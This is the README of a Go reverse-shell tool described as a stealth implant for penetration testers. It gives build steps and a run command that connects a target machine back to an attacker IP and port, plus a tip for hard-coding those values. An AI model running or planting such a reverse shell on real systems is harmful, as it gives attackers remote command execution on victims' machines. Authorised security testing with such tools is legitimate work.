# Go-ReverseShell

[![Build Status](https://travis-ci.com/lismore/go-reverseshell.svg?branch=master)](https://travis-ci.com/lismore/go-reverseshell)

This is a stealth GO implementation of a reverse shell.  Penetration Testers can use this reverse shell for stealth engagements.

  - Enables penetration tester to execture commands on target of evaluation

# New Features!

  - Initial Proof of Concept

### Tech

Go-ReverseShell is implemented in GO programming language

### Installation

### Step 1: Build

From the root directory open a terminal and type the following command to generate your own binary

``` shell
go build go-reverseshell.go YouExeName.exe 
```
or
```
go build go-reverseshell.go
```
This builds an exe of the same name.

### Step 2: Run
From command prompt/powershell/terminal execute the following binary to call back to your attacker machine
``` CMD
.\go-reverseshell.exe -targetIP="127.0.0.1" -targetPort=4444
```

if you want to execute the reverse shell without parameters, hard code the attackerIP and port and rebuild: go build go-reverseshell.go

### Development

Want to contribute? Great!

Fork, submit a pull request

License
----

MIT

